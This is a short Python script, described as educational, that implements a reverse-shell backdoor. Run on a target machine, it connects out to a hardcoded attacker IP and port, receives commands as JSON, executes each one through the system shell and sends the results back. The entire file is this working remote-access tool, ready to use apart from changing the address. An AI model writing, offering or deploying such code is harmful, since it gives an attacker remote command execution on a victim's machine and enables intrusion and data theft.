#!/user/bin/env python
"""
Author：Seldon Pang

Establish a reverse connection from the target machine
Please use for educational purpose only...
"""

import socket
# https://docs.python.org/2/library/socket.html
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # self.connection.send("\n[+] Connection established from " + str(ip))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            received_command = self.reliable_receive()

            if received_command[0] == "exit":
                self.connection.close()
                exit()

            command_result = self.execute_system_command(received_command)
            self.reliable_send(command_result)


# Replace ip and port of your choice
my_backdoor = Backdoor("192.168.1.24", 4444)
my_backdoor.run()
